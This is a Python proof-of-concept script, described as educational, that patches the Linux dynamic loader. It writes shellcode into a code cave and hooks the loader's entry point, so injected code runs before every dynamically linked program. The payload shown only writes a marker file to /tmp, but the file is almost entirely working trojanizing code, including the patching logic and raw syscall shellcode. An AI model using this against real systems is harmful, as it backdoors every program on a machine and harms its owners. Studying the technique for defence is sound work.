#!/usr/bin/env python3
"""
Trojanized Loader POC - Binary Patcher
Educational demonstration of loader hijacking

This script patches the dynamic linker (ld-linux.so.2) to inject
malicious code that executes BEFORE any dynamically-linked program.

Attack Flow:
1. Find code cave in the loader binary (unused padding)
2. Inject shellcode that creates a marker file
3. Redirect entry point to our shellcode
4. Shellcode executes original entry code and returns to normal flow
"""

import struct
import os
import sys

# Configuration
LOADER_PATH = "ld-evil.so.2"
OUTPUT_PATH = "ld-trojanized.so.2"
MARKER_FILE = b"/tmp/PWNED_BY_LOADER\x00"

# Addresses from our analysis (adjust based on your binary)
ORIGINAL_ENTRY = 0x1f540
CODE_CAVE_OFFSET = 0x2b1a0  # File offset where we inject
CODE_CAVE_VADDR = 0x2b1a0   # Virtual address (same for PIE at 0 base)

def create_shellcode():
    """
    Create shellcode that:
    1. Saves all registers
    2. Opens/creates a marker file
    3. Writes a message
    4. Closes the file
    5. Restores registers
    6. Executes original entry point instructions
    7. Jumps back to continue normal execution

    This uses raw syscalls to avoid any library dependencies.
    """

    # Message to write to the marker file
    message = b"[TROJANIZED LOADER] Executed before program!\n" \
              b"[TROJANIZED LOADER] PID: will vary\n" \
              b"[TROJANIZED LOADER] All your base are belong to us.\n\x00"

    # We'll build the shellcode in parts
    shellcode = b""

    # ==================== SAVE STATE ====================
    # Save all registers we'll use
    shellcode += b"\x50"                    # push rax
    shellcode += b"\x51"                    # push rcx
    shellcode += b"\x52"                    # push rdx
    shellcode += b"\x56"                    # push rsi
    shellcode += b"\x57"                    # push rdi
    shellcode += b"\x41\x50"                # push r8
    shellcode += b"\x41\x51"                # push r9
    shellcode += b"\x41\x52"                # push r10
    shellcode += b"\x41\x53"                # push r11

    # ==================== OPEN FILE ====================
    # open("/tmp/PWNED_BY_LOADER", O_WRONLY|O_CREAT|O_APPEND, 0644)
    # syscall: rax=2 (open), rdi=path, rsi=flags, rdx=mode

    # lea rdi, [rip + path_offset] - we'll calculate this
    # For now, use a placeholder and calculate later
    shellcode += b"\x48\x8d\x3d"            # lea rdi, [rip + ...]
    path_offset_pos = len(shellcode)        # Remember where to patch
    shellcode += b"\x00\x00\x00\x00"         # Placeholder for offset

    shellcode += b"\x48\xc7\xc6\x41\x04\x00\x00"  # mov rsi, 0x441 (O_WRONLY|O_CREAT|O_APPEND)
    shellcode += b"\x48\xc7\xc2\xa4\x01\x00\x00"  # mov rdx, 0644 (mode)
    shellcode += b"\x48\xc7\xc0\x02\x00\x00\x00"  # mov rax, 2 (sys_open)
    shellcode += b"\x0f\x05"                      # syscall

    # Save fd
    shellcode += b"\x49\x89\xc0"             # mov r8, rax (save fd)

    # ==================== WRITE MESSAGE ====================
    # write(fd, message, len)
    shellcode += b"\x4c\x89\xc7"             # mov rdi, r8 (fd)

    # lea rsi, [rip + msg_offset]
    shellcode += b"\x48\x8d\x35"             # lea rsi, [rip + ...]
    msg_offset_pos = len(shellcode)
    shellcode += b"\x00\x00\x00\x00"         # Placeholder

    msg_len = len(message) - 1  # Exclude null terminator
    shellcode += b"\x48\xc7\xc2" + struct.pack("<I", msg_len)  # mov rdx, len
    shellcode += b"\x48\xc7\xc0\x01\x00\x00\x00"  # mov rax, 1 (sys_write)
    shellcode += b"\x0f\x05"                      # syscall

    # ==================== CLOSE FILE ====================
    # close(fd)
    shellcode += b"\x4c\x89\xc7"             # mov rdi, r8 (fd)
    shellcode += b"\x48\xc7\xc0\x03\x00\x00\x00"  # mov rax, 3 (sys_close)
    shellcode += b"\x0f\x05"                      # syscall

    # ==================== RESTORE STATE ====================
    shellcode += b"\x41\x5b"                # pop r11
    shellcode += b"\x41\x5a"                # pop r10
    shellcode += b"\x41\x59"                # pop r9
    shellcode += b"\x41\x58"                # pop r8
    shellcode += b"\x5f"                    # pop rdi
    shellcode += b"\x5e"                    # pop rsi
    shellcode += b"\x5a"                    # pop rdx
    shellcode += b"\x59"                    # pop rcx
    shellcode += b"\x58"                    # pop rax

    # ==================== EXECUTE ORIGINAL CODE ====================
    # Original instruction at entry: mov rdi, rsp (48 89 e7)
    shellcode += b"\x48\x89\xe7"            # mov rdi, rsp

    # Jump back to original entry + 3 (skip the mov we just executed)
    # We need a relative jump: jmp <offset>
    # This will be a jump to ORIGINAL_ENTRY + 3 from our current position
    shellcode += b"\xe9"                    # jmp rel32
    jmp_back_pos = len(shellcode)
    shellcode += b"\x00\x00\x00\x00"         # Placeholder

    # ==================== DATA SECTION ====================
    # Store our strings after the code
    path_data_offset = len(shellcode)
    shellcode += MARKER_FILE

    msg_data_offset = len(shellcode)
    shellcode += message

    # ==================== PATCH OFFSETS ====================
    # Now calculate and patch the RIP-relative offsets

    # Path offset: from end of LEA instruction to path data
    # LEA is at path_offset_pos - 3, ends at path_offset_pos + 4
    # RIP at that point = CODE_CAVE_VADDR + path_offset_pos + 4
    # Target = CODE_CAVE_VADDR + path_data_offset
    path_rel = path_data_offset - (path_offset_pos + 4)
    shellcode = (shellcode[:path_offset_pos] +
                 struct.pack("<i", path_rel) +
                 shellcode[path_offset_pos + 4:])

    # Message offset
    msg_rel = msg_data_offset - (msg_offset_pos + 4)
    shellcode = (shellcode[:msg_offset_pos] +
                 struct.pack("<i", msg_rel) +
                 shellcode[msg_offset_pos + 4:])

    # Jump back offset: from end of JMP to ORIGINAL_ENTRY + 3
    # Current pos in virtual memory: CODE_CAVE_VADDR + jmp_back_pos + 4
    # Target: ORIGINAL_ENTRY + 3
    jmp_target = ORIGINAL_ENTRY + 3
    jmp_from = CODE_CAVE_VADDR + jmp_back_pos + 4
    jmp_rel = jmp_target - jmp_from
    shellcode = (shellcode[:jmp_back_pos] +
                 struct.pack("<i", jmp_rel) +
                 shellcode[jmp_back_pos + 4:])

    return shellcode

def create_entry_hook():
    """
    Create the hook that redirects entry point to our code cave.
    We'll overwrite the first 5 bytes of the entry point with a JMP.

    Original: 48 89 e7 (mov rdi, rsp) + e8 88 0c 00 00 (call ...)
    New:      e9 XX XX XX XX (jmp to code cave)

    Note: This overwrites into the call instruction, but we don't care
    because we execute the original mov in our shellcode and jump back
    to entry + 3, which is the call instruction.

    Wait - that corrupts the call. Let me reconsider...
    Actually, we overwrite bytes at ORIGINAL_ENTRY:
    - 48 89 e7 = mov rdi, rsp (3 bytes)
    - e8 = start of call (we overwrite this too)

    Hmm, we need to jump to entry+3, but entry+3 is the call instruction
    which starts with e8. If we overwrote part of it with our jmp...

    Let me check: jmp rel32 = e9 XX XX XX XX (5 bytes)
    We write at offset 0x1f540, so we overwrite bytes 0x1f540-0x1f544
    - 0x1f540: 48 -> e9 (jmp opcode)
    - 0x1f541: 89 -> XX
    - 0x1f542: e7 -> XX
    - 0x1f543: e8 -> XX (this was the call opcode!)
    - 0x1f544: 88 -> XX

    So we corrupt the call instruction. The call at 0x1f543 is:
    e8 88 0c 00 00 (5 bytes)

    We need to handle this differently. Options:
    1. Execute the call from our shellcode (recalculate offset)
    2. Use a shorter jump that fits in 3 bytes (impossible for this distance)
    3. Overwrite exactly 8 bytes (mov + call) and execute both from shellcode

    Let's go with option 3: overwrite 8 bytes and handle both instructions.
    But wait, the call uses relative addressing, so we need to fix it.

    Actually, simplest solution: use a 2-byte jump (short jmp) if in range.
    Distance: CODE_CAVE_VADDR - (ORIGINAL_ENTRY + 2) = 0x2b1a0 - 0x1f542 = 0xbc5e
    That's way more than 127 bytes, so short jmp won't work.

    Better solution: Patch just 5 bytes and restore the call instruction.
    But the call's first byte is at 0x1f543 which we don't touch if we only
    patch 5 bytes... wait, let me recount.

    5 bytes from 0x1f540 = 0x1f540, 0x1f541, 0x1f542, 0x1f543, 0x1f544

    Original bytes:
    0x1f540: 48 (mov opcode)
    0x1f541: 89
    0x1f542: e7
    0x1f543: e8 (call opcode)
    0x1f544: 88

    So yes, we overwrite the call opcode. We need to restore it.

    New plan: Overwrite with jmp, and in shellcode execute:
    1. mov rdi, rsp
    2. call <fixed_address> (with recalculated offset)
    3. Then jump to entry + 8 (after both instructions)

    Let's implement this properly.
    """

    # Calculate relative jump offset
    # jmp is at ORIGINAL_ENTRY (0x1f540)
    # After jmp instruction (5 bytes), RIP = ORIGINAL_ENTRY + 5
    # We want to jump to CODE_CAVE_VADDR
    jmp_from = ORIGINAL_ENTRY + 5
    jmp_to = CODE_CAVE_VADDR
    rel_offset = jmp_to - jmp_from

    # Build the jmp instruction
    hook = b"\xe9" + struct.pack("<i", rel_offset)

    return hook

def create_full_shellcode():
    """
    Create complete shellcode that handles the entry point properly.
    Since we overwrite 5 bytes which includes part of the call instruction,
    we need to execute both the mov AND the call from our shellcode.
    """

    message = b"[TROJANIZED LOADER] Code executed before program start!\n\x00"

    shellcode = b""

    # ==================== SAVE ALL STATE ====================
    shellcode += b"\x50"                    # push rax
    shellcode += b"\x51"                    # push rcx
    shellcode += b"\x52"                    # push rdx
    shellcode += b"\x56"                    # push rsi
    shellcode += b"\x57"                    # push rdi
    shellcode += b"\x41\x50"                # push r8
    shellcode += b"\x41\x51"                # push r9
    shellcode += b"\x41\x52"                # push r10
    shellcode += b"\x41\x53"                # push r11

    # ==================== CREATE MARKER FILE ====================
    # open("/tmp/PWNED_BY_LOADER", O_WRONLY|O_CREAT|O_TRUNC, 0644)
    shellcode += b"\x48\x8d\x3d"            # lea rdi, [rip + path]
    path_offset_pos = len(shellcode)
    shellcode += b"\x00\x00\x00\x00"         # placeholder
    shellcode += b"\x48\xc7\xc6\x41\x02\x00\x00"  # mov rsi, O_WRONLY|O_CREAT|O_TRUNC
    shellcode += b"\x48\xc7\xc2\xa4\x01\x00\x00"  # mov rdx, 0644
    shellcode += b"\x48\xc7\xc0\x02\x00\x00\x00"  # mov rax, SYS_open
    shellcode += b"\x0f\x05"                      # syscall
    shellcode += b"\x49\x89\xc0"                  # mov r8, rax (save fd)

    # ==================== WRITE MESSAGE ====================
    shellcode += b"\x4c\x89\xc7"             # mov rdi, r8
    shellcode += b"\x48\x8d\x35"             # lea rsi, [rip + msg]
    msg_offset_pos = len(shellcode)
    shellcode += b"\x00\x00\x00\x00"         # placeholder
    shellcode += b"\x48\xc7\xc2" + struct.pack("<I", len(message)-1)  # mov rdx, len
    shellcode += b"\x48\xc7\xc0\x01\x00\x00\x00"  # mov rax, SYS_write
    shellcode += b"\x0f\x05"                      # syscall

    # ==================== CLOSE FILE ====================
    shellcode += b"\x4c\x89\xc7"             # mov rdi, r8
    shellcode += b"\x48\xc7\xc0\x03\x00\x00\x00"  # mov rax, SYS_close
    shellcode += b"\x0f\x05"                      # syscall

    # ==================== RESTORE STATE ====================
    shellcode += b"\x41\x5b"                # pop r11
    shellcode += b"\x41\x5a"                # pop r10
    shellcode += b"\x41\x59"                # pop r9
    shellcode += b"\x41\x58"                # pop r8
    shellcode += b"\x5f"                    # pop rdi
    shellcode += b"\x5e"                    # pop rsi
    shellcode += b"\x5a"                    # pop rdx
    shellcode += b"\x59"                    # pop rcx
    shellcode += b"\x58"                    # pop rax

    # ==================== EXECUTE ORIGINAL ENTRY CODE ====================
    # Original instructions we overwrote:
    # 0x1f540: 48 89 e7        mov rdi, rsp
    # 0x1f543: e8 88 0c 00 00  call 0x201d0
    #
    # We need to execute mov, then call with fixed offset, then continue at 0x1f548

    # Execute: mov rdi, rsp
    shellcode += b"\x48\x89\xe7"

    # Execute: call 0x201d0 (need to recalculate relative offset from here)
    # Current RIP after this call instruction = CODE_CAVE_VADDR + current_pos + 5
    # Target = 0x201d0
    call_pos = len(shellcode)
    shellcode += b"\xe8"                     # call rel32
    shellcode += b"\x00\x00\x00\x00"          # placeholder

    # After call returns, jump to original entry + 8 (after mov+call)
    shellcode += b"\xe9"                     # jmp rel32
    jmp_back_pos = len(shellcode)
    shellcode += b"\x00\x00\x00\x00"          # placeholder

    # ==================== DATA ====================
    path_data_offset = len(shellcode)
    shellcode += MARKER_FILE

    msg_data_offset = len(shellcode)
    shellcode += message

    # ==================== PATCH OFFSETS ====================

    # Fix path offset
    path_rel = path_data_offset - (path_offset_pos + 4)
    shellcode = shellcode[:path_offset_pos] + struct.pack("<i", path_rel) + shellcode[path_offset_pos + 4:]

    # Fix message offset
    msg_rel = msg_data_offset - (msg_offset_pos + 4)
    shellcode = shellcode[:msg_offset_pos] + struct.pack("<i", msg_rel) + shellcode[msg_offset_pos + 4:]

    # Fix call offset (call to 0x201d0)
    call_from = CODE_CAVE_VADDR + call_pos + 5  # RIP after call instruction
    call_target = 0x201d0
    call_rel = call_target - call_from
    shellcode = shellcode[:call_pos + 1] + struct.pack("<i", call_rel) + shellcode[call_pos + 5:]

    # Fix jump back offset (jump to ORIGINAL_ENTRY + 8)
    jmp_from = CODE_CAVE_VADDR + jmp_back_pos + 4  # RIP after jmp instruction
    jmp_target = ORIGINAL_ENTRY + 8
    jmp_rel = jmp_target - jmp_from
    shellcode = shellcode[:jmp_back_pos] + struct.pack("<i", jmp_rel) + shellcode[jmp_back_pos + 4:]

    return shellcode

def patch_loader():
    """Main patching function"""

    print("[*] Trojanized Loader POC - Binary Patcher")
    print("[*] =" * 25)
    print()

    # Read original loader
    print(f"[*] Reading original loader: {LOADER_PATH}")
    with open(LOADER_PATH, "rb") as f:
        data = bytearray(f.read())

    original_size = len(data)
    print(f"[*] Original size: {original_size} bytes")

    # Verify entry point
    print(f"[*] Entry point: 0x{ORIGINAL_ENTRY:x}")
    print(f"[*] Code cave location: 0x{CODE_CAVE_OFFSET:x}")

    # Show original bytes at entry point
    orig_bytes = bytes(data[ORIGINAL_ENTRY:ORIGINAL_ENTRY+16])
    print(f"[*] Original bytes at entry: {orig_bytes.hex()}")

    # Generate shellcode
    print("[*] Generating shellcode...")
    shellcode = create_full_shellcode()
    print(f"[*] Shellcode size: {len(shellcode)} bytes")

    # Verify code cave has space
    cave_check = bytes(data[CODE_CAVE_OFFSET:CODE_CAVE_OFFSET+len(shellcode)])
    if cave_check != b'\x00' * len(shellcode):
        print(f"[!] Warning: Code cave may not be empty!")
        print(f"[!] First bytes: {cave_check[:32].hex()}")

    # Inject shellcode into code cave
    print(f"[*] Injecting shellcode at offset 0x{CODE_CAVE_OFFSET:x}...")
    for i, b in enumerate(shellcode):
        data[CODE_CAVE_OFFSET + i] = b

    # Create entry point hook
    print("[*] Creating entry point hook...")
    hook = create_entry_hook()
    print(f"[*] Hook bytes: {hook.hex()}")

    # Patch entry point
    print(f"[*] Patching entry point at 0x{ORIGINAL_ENTRY:x}...")
    for i, b in enumerate(hook):
        data[ORIGINAL_ENTRY + i] = b

    # Show patched bytes
    patched_bytes = bytes(data[ORIGINAL_ENTRY:ORIGINAL_ENTRY+16])
    print(f"[*] Patched bytes at entry: {patched_bytes.hex()}")

    # Write output
    print(f"[*] Writing trojanized loader: {OUTPUT_PATH}")
    with open(OUTPUT_PATH, "wb") as f:
        f.write(data)

    # Make executable
    os.chmod(OUTPUT_PATH, 0o755)

    print()
    print("[+] Patching complete!")
    print()
    print("[*] Attack summary:")
    print(f"    - Original entry: 0x{ORIGINAL_ENTRY:x}")
    print(f"    - Redirects to:   0x{CODE_CAVE_VADDR:x}")
    print(f"    - Creates file:   {MARKER_FILE.decode().strip(chr(0))}")
    print(f"    - Then continues normal execution")
    print()
    print("[*] To test, compile victim.c and patch it to use the evil loader")

if __name__ == "__main__":
    patch_loader()
